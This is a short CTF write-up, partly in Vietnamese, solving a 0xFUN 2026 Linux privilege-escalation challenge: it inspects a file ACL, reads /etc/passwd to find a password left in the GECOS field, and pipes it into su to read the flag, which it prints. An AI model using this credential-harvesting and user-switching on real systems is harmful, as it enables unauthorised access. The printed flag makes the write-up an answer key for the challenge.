# Strict restrictions to earn the flag - 0xFUN CTF 2026

## Category: Misc / Linux Privesc

## Challenge Info

- **Description:** Strict restrictions to earn the flag.
- **Credentials:** `usr: trapped | pswd: password`
- **Connection:** `ssh -o StrictHostKeyChecking=no trapped@chall.0xfun.org -p53668`

## Solution

### Step 1: SSH vào server

```bash
ssh -o StrictHostKeyChecking=no trapped@chall.0xfun.org -p53668
# Password: password
```

### Step 2: Kiểm tra flag.txt

```bash
trapped@challenge:~$ ls -la
----r-----+ 1 root root 27 Nov 17 05:28 flag.txt
```

File `flag.txt` thuộc root:root, permission `----r-----` nhưng có dấu `+` -> file có **ACL (Access Control List)**.

```bash
trapped@challenge:~$ getfacl flag.txt
# owner: root
# group: root
user::---
user:secretuser:r--
group::---
mask::r--
other::---
```

Chỉ có user `secretuser` được ACL cho phép đọc file.

### Step 3: Tìm password của secretuser trong /etc/passwd

```bash
trapped@challenge:~$ cat /etc/passwd | grep secretuser
secretuser:x:1001:1001:Unc0ntr0lled1234Passw0rd:/home/secretuser:/bin/sh
```

Password `Unc0ntr0lled1234Passw0rd` bị lộ ngay trong trường GECOS (comment) của `/etc/passwd`.

### Step 4: su sang secretuser và đọc flag

```bash
trapped@challenge:~$ echo "Unc0ntr0lled1234Passw0rd" | su -c "cat /home/trapped/flag.txt" secretuser
0xfun{4ccess_unc0ntroll3d}
```

## Flag

```
0xfun{4ccess_unc0ntroll3d}
```
